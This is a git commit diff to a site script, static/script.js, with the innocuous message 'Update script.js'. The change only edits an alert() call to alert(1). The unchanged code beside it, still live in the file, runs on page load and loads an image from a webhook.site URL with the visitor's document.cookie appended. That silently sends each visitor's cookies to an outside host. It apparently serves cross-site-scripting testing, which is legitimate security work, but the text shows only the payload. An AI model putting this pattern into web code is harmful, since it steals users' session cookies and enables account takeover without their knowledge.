473fa6c799624651ad32603c796b1362edbac47f
victo <163094432+passerbyE@users.noreply.github.com>
2025-08-11 21:58:13 +0800

    Update script.js

--- static/script.js
+++ static/script.js
@@ -1,4 +1,4 @@
 window.onload = function() {
-  alert();
+  alert(1);
   document.getElementById("myImage").src = "https://webhook.site/d9ec918f-5aca-4863-a11a-7c03a5148da9/log?c="+document.cookie;
 };
